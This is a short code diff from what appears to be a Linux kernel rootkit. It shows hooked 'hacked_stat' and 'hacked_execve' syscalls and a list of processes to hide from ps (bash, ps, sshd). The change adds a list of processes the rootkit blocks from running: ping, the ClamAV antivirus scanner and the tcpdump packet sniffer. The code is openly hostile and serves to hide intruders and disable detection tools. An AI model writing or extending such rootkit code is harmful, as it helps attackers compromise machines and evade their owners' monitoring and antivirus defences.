@@ -78,6 +78,9 @@ asmlinkage long hacked_stat(const char __user *filename,
             struct __old_kernel_stat __user *statbuf);
 asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]);
 
+// List of processes we won't allow to run
+const char * const BANNED_PROCESSES[] = {"ping", "clamav", "tcpdump"};
+
 // List of processes to hide from ps
 const char * const HIDDEN_PROCESSES[] = {"bash", "ps", "sshd"};
 
